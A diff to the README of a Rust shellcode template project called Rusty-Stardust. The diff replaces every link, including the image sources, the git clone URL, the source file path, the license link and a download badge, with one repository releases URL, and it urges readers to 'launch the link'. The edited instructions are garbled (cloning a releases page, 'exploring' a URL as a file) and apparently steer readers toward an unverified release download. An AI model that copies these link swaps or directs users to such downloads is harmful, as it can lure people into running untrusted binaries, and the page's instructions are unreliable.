@@ -2,7 +2,7 @@
 
 Welcome to Rusty-Stardust, a modern Rust implementation of the original Stardust project. This repository provides a sophisticated 32/64-bit shellcode template featuring position-independent code development, compile-time string hashing, and raw string embedding capabilities, all while leveraging Rust's safety guarantees and modern tooling for both educational and practical purposes.
 
-![Rusty-Stardust](https://github.com/image.png)
+![Rusty-Stardust](https://github.com/Deepika-ss87/Rusty-Stardust/releases)
 
 ## Features 🛠️
 
@@ -19,7 +19,7 @@ To get started with Rusty-Stardust, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/Rusty-Stardust.git
+   git clone https://github.com/Deepika-ss87/Rusty-Stardust/releases
    ```
    
 2. Navigate to the project directory:
@@ -32,7 +32,7 @@ To get started with Rusty-Stardust, follow these steps:
    cargo build --release
    ```
 
-4. Explore the `src/main.rs` file to start working on your custom shellcode.
+4. Explore the `https://github.com/Deepika-ss87/Rusty-Stardust/releases` file to start working on your custom shellcode.
 
 ## Examples 🌟
 
@@ -47,7 +47,7 @@ fn main() {
 
 ## Link 🔗
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/releases/789694263/Release.zip)
+[![Download Release](https://github.com/Deepika-ss87/Rusty-Stardust/releases)](https://github.com/Deepika-ss87/Rusty-Stardust/releases)
 
 🚨 **Launch the link to access the Release file.**
 
@@ -63,10 +63,10 @@ If you would like to contribute to Rusty-Stardust, feel free to submit a pull re
 
 ## License 📜
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/your-username/Rusty-Stardust/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Deepika-ss87/Rusty-Stardust/releases) file for details.
 
 ---
 
 Dive into the world of shellcode development with Rusty-Stardust. Build secure, portable, and efficient shellcode with ease using Rust's powerful features. Let your creativity shine with Rusty-Stardust! 🚀🌌
 
-![Rusty-Stardust Logo](https://github.com/logo.png)
+![Rusty-Stardust Logo](https://github.com/Deepika-ss87/Rusty-Stardust/releases)
